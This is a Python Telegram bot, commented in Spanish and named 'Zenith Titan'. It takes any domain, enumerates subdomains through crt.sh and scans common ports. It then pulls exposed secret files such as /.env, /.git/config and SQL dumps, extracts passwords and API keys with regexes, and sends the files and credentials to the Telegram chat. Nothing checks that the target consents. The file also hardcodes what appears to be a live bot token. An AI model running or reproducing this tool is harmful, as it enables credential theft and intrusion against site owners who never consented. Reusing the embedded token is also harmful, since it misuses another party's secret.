import telebot
import requests
import socket
import concurrent.futures
import io
import re

# --- CONFIGURACIÓN ---
TOKEN = '8617287173:AAEqfwt8VUElbKijddKGbQmreAKSBl-ipwU'
bot = telebot.TeleBot(TOKEN)

# Archivos objetivo para extracción
TARGET_FILES = [
    '/.env', '/.git/config', '/backup.sql', '/database.sql', 
    '/db.sql', '/dump.sql', '/config.php', '/settings.py', '/.htaccess'
]

# Puertos comunes para detectar servicios
COMMON_PORTS = [21, 22, 80, 443, 3306, 5432, 8080]

# --- FUNCIONES DE APOYO ---

def find_subdomains(domain):
    """Busca subdominios mediante registros SSL públicos"""
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            return sorted(list(set(entry['name_value'].lower() for entry in r.json())))
    except: return []
    return []

def scan_port(ip, port):
    """Verifica si un puerto está abierto"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0: return port
    except: return None

def download_and_extract(chat_id, url):
    """Descarga archivos, busca credenciales y los envía"""
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'}
    try:
        # verify=False para saltar errores de SSL en sitios dev
        r = requests.get(url, headers=headers, timeout=8, verify=False, allow_redirects=False)
        
        if r.status_code == 200 and len(r.text) > 0:
            # Buscar patrones de acceso rápido (Passwords, Keys, Users)
            patterns = [r'DB_PASSWORD=.*', r'DB_USER=.*', r'API_KEY=.*', r'PWD=.*']
            matches = []
            for p in patterns:
                matches.extend(re.findall(p, r.text, re.IGNORECASE))
            
            caption = f"🚩 Archivo detectado: {url.split('/')[-1]}"
            if matches:
                caption += "\n🔑 **Accesos encontrados:**\n" + "\n".join(matches)
            
            # Preparar archivo para envío
            file_io = io.BytesIO(r.content)
            file_io.name = f"EXTRAIDO_{url.split('/')[-1]}.txt"
            bot.send_document(chat_id, file_io, caption=caption)
            return True
    except: pass
    return False

# --- COMANDOS DEL BOT ---

@bot.message_handler(commands=['titan'])
def full_audit(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Uso: /titan dominio.com (sin http)")
        return

    target = args[1]
    chat_id = message.chat.id
    bot.send_message(chat_id, f"🛡️ **Zenith Titan: Iniciando Operación Total en {target}**")

    # 1. Fase de Subdominios
    bot.send_message(chat_id, "🔍 Buscando subdominios...")
    subs = find_subdomains(target)
    if subs:
        bot.send_message(chat_id, "✅ Subdominios encontrados:\n`" + "\n".join(subs[:10]) + "`")

    # 2. Fase de Puertos
    try:
        ip = socket.gethostbyname(target)
        open_ports = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan_port, ip, p) for p in COMMON_PORTS]
            for f in concurrent.futures.as_completed(futures):
                p = f.result()
                if p: open_ports.append(str(p))
        if open_ports:
            bot.send_message(chat_id, f"🔌 **Puertos Abiertos en {target}:** {', '.join(open_ports)}")
    except:
        bot.send_message(chat_id, "❌ No se pudo resolver la IP del dominio.")

    # 3. Fase de Extracción
    bot.send_message(chat_id, "📥 Intentando extraer archivos sensibles...")
    found_count = 0
    # Intentamos con https y http por si acaso
    for protocol in ['https://', 'http://']:
        base_url = f"{protocol}{target}"
        for path in TARGET_FILES:
            if download_and_extract(chat_id, f"{base_url}{path}"):
                found_count += 1
    
    if found_count == 0:
        bot.send_message(chat_id, "✅ No se encontraron archivos expuestos en rutas comunes.")
    
    bot.send_message(chat_id, "🏁 **Auditoría Zenith Titan finalizada.**")

bot.infinity_polling()
